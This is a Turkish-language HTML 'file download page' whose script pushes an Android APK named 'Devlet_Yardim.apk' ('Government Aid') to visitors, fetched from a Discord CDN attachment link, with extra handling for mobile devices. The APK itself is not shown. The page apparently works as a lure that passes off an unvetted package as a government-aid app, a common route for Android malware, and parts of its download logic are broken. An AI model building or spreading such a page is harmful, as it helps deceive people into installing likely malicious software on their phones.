<!DOCTYPE html>
<html>
<head>
    <title>Dosya İndirme Sayfası</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
        }

        .container {
            margin: 50px auto;
            width: 80%;
            max-width: 600px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.3);
            padding: 20px;
            text-align: center;
        }

        h1 {
            font-size: 30px;
            margin-bottom: 20px;
        }

        p {
            font-size: 20px;
            margin-bottom: 20px;
        }

        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-size: 20px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Dosya İndirme Sayfası</h1>
        <p>İndirme işlemi başlatıldı. Lütfen bekleyin...</p>
        <button onclick="download()" id="download-btn">Dosyayı İndir</button>
        <p id="error-message" class="hidden">İndirme başarısız oldu. Lütfen yeniden deneyin.</p>
    </div>

    <script type="text/javascript">
        function download() {
            // indirme linki
            var fileUrl = 'https://cdn.discordapp.com/attachments/1060600370616864772/1075827122771333190/Devlet_Yardim.apk';

            // mobil cihazlarda varsayılan indirme klasörü
            var mobileDownloadFolder = 'sdcard/Download/';

            // varsayılan indirme konumu
            var defaultDownloadFolder = 'downloads/';

            // mobil cihaz kullanıcısı mı kontrol edilir
            function isMobile() {
                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            }

            // varsayılan indirme konumu belirlenir
            var defaultDownloadFolder = isMobile() ? mobileDownloadFolder : defaultDownloadFolder;

            // indirme konumunu seç
            var options = {
                types: [
                    {
                        description: 'Dosyayı kaydedeceğiniz konumu seçin',
                        accept: {
                            'application/*': ['.apk']
                        }
                    }
                ]
            };

            if ('showSaveFilePicker' in window) {
                window.showSaveFilePicker(options)
                    .then(function (handle) {
                        handle.getFile()
                            .then(function (file) {
                                var saveLocation = file.name;
                                var link = document.createElement("a");
                                link.download = saveLocation;
                                link.href = fileUrl;
                                link.click();

                                                                // indirme tamamlandığında mesajı göster
                                setTimeout(function() {
                                    document.getElementById("download-btn").classList.add("hidden");
                                    document.getElementsByTagName("p")[0].classList.add("hidden");
                                    if (!link.href) {
                                        document.getElementById("error-message").classList.remove("hidden");
                                        document.getElementById("download-btn").classList.remove("hidden");
                                    }
                                }, 1000);
                            });
                    })
                    .catch(function (err) {
                        console.error(err);
                        document.getElementById("error-message").classList.remove("hidden");
                        document.getElementById("download-btn").classList.remove("hidden");
                    });
            }
            else {
                // indirme işlemi başlatılır
                var saveLocation = defaultDownloadFolder;
                var link = document.createElement("a");
                link.download = fileUrl.split('/').pop();
                link.href = fileUrl;
                link.click();

                // indirme tamamlandığında mesajı göster
                setTimeout(function() {
                    document.getElementById("download-btn").classList.add("hidden");
                    document.getElementsByTagName("p")[0].classList.add("hidden");
                    if (!link.href) {
                        document.getElementById("error-message").classList.remove("hidden");
                        document.getElementById("download-btn").classList.remove("hidden");
                    }
                }, 1000);
            }
        }
    </script>
</body>
</html>
